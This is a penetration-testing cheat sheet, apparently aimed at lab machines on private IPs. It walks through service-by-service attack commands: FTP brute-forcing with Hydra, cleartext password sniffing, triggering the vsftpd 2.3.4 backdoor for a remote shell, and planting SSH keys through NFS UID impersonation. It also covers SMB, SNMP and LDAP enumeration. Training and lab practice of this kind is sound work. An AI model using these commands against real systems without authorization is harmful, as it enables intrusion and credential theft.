🛡️ Network Protocols & Pentesting Guide
📍 Nmap
Nmap (Network Mapper) is a top open-source tool used for network scanning and security auditing.
It can save scan results in multiple formats for later analysis.

📂 FTP (File Transfer Protocol)
FTP is a client-server protocol that transfers files over TCP (Ports 20/21).
It uses:

Command Channel: Controls conversation.

Data Channel: Transfers files.

📋 Penetration Testing on FTP
<details> <summary><strong>Anonymous Login</strong></summary>
bash
Copy
Edit
ftp 192.168.188.131
Name: Anonymous
Password: Anonymous
🎯 Successful login places you inside the FTP server.

</details> <details> <summary><strong>Sniffing FTP Credentials</strong></summary>
Since FTP sends credentials unencrypted, use Wireshark to capture cleartext login info:

bash
Copy
Edit
frame contains "PASS"
Follow TCP stream to view username/password.

</details> <details> <summary><strong>Bruteforce FTP using Hydra</strong></summary>
bash
Copy
Edit
hydra -L user -P pass 192.168.188.131 ftp
hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp
🛠 Hydra supports many protocols beyond FTP too!

</details> <details> <summary><strong>Exploit FTP Backdoor (vsftpd)</strong></summary>
bash
Copy
Edit
sudo nmap -p 21 192.168.188.131 -sV --script ftp-vsftpd-backdoor.nse
Connect manually:

bash
Copy
Edit
nc 192.168.188.131 21
USER yourname:)
PASS yourname
Spawn remote shell:

bash
Copy
Edit
nc 192.168.188.131 6200
whoami
python -c 'import pty; pty.spawn("/bin/bash")'
</details> <details> <summary><strong>Exploiting vsFTPd 2.3.4 with Metasploit</strong></summary>
bash
Copy
Edit
msfconsole
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.188.131
exploit
Post-Exploitation:

bash
Copy
Edit
python -c 'import pty; pty.spawn("/bin/bash")'
find / -iname user.txt -exec wc {} \;
</details>
📦 NFS (Network File System)
NFS allows remote mounting of filesystems over a network.

<details> <summary><strong>Enumerating NFS Shares</strong></summary>
bash
Copy
Edit
nmap -p 2049 -sV 192.168.188.131
Or:

bash
Copy
Edit
sudo nmap 192.168.188.137 --script nfs-showmount
</details> <details> <summary><strong>Mounting & Exploiting NFS Shares</strong></summary>
Mounting:

bash
Copy
Edit
sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock
Mounting with specific NFS version:

bash
Copy
Edit
sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock
Create a matching user:

bash
Copy
Edit
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --groups vulnix_group vulnix
Generate SSH keys and push:

bash
Copy
Edit
ssh-keygen -t rsa -b 4096
cat ~/.ssh/id_rsa.pub | sudo -u vulnix tee -a vulnix/.ssh/authorized_keys
Login:

bash
Copy
Edit
ssh vulnix@192.168.188.137
</details>
🗂️ SMB (Server Message Block)
SMB is used for file/printer sharing, operating over port 445.

<details> <summary><strong>Enumerating SMB Shares</strong></summary>
bash
Copy
Edit
nmap -p 445 -sV -sC 192.168.188.131

enum4linux -L -S 192.168.188.131
smbclient -L \\192.168.188.131 -N
smbmap -H 192.168.188.131
</details> <details> <summary><strong>Exploiting SMB Vulnerabilities</strong></summary>
Samba 3.0.20 RCE:

bash
Copy
Edit
searchsploit samba 3.0.20
Anonymous SMB Access:

bash
Copy
Edit
smbclient --no-pass //192.168.188.131/tmp
</details>
🔌 RPC (Remote Procedure Call)
RPC allows running procedures on remote machines.

<details> <summary><strong>Connecting to RPC</strong></summary>
bash
Copy
Edit
rpcclient 192.168.188.131 -U ''
Commands:

bash
Copy
Edit
srvinfo         # Server info
enumdomusers    # Enumerate users
</details>
📡 SNMP (Simple Network Management Protocol)
SNMP allows network device monitoring over UDP 161.

<details> <summary><strong>SNMP Enumeration</strong></summary>
Enumerate:

bash
Copy
Edit
snmpwalk -v1 -c public 192.168.146.156
snmpcheck -t 192.168.146.156
Bruteforce Community Strings:

bash
Copy
Edit
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156
</details>
📚 LDAP (Lightweight Directory Access Protocol)
LDAP manages user and system directories centrally.

<details> <summary><strong>LDAP Enumeration</strong></summary>
bash
Copy
Edit
ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
ldapwhoami -x -H ldap://<IP>
nmap -p 389 --script ldap-search <IP>
Metasploit:

bash
Copy
Edit
use auxiliary/gather/ldap_query
set RHOSTS <IP>
run
</details>
🔒 SSH (Secure Shell)
SSH enables encrypted remote login.

<details> <summary><strong>SSH Key Authentication</strong></summary>
Generate keys:

bash
Copy
Edit
ssh-keygen
Push public key to server:

bash
Copy
Edit
cat ~/.ssh/id_rsa.pub | ssh user@server "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
Connect:

bash
Copy
Edit
ssh user@server
</details>
🎯 Final Tips
Always analyze Nmap output carefully.

Use scripts and tools (hydra, enum4linux, smbclient, etc.) effectively.

Check for version vulnerabilities (services like SMB, FTP, NFS).
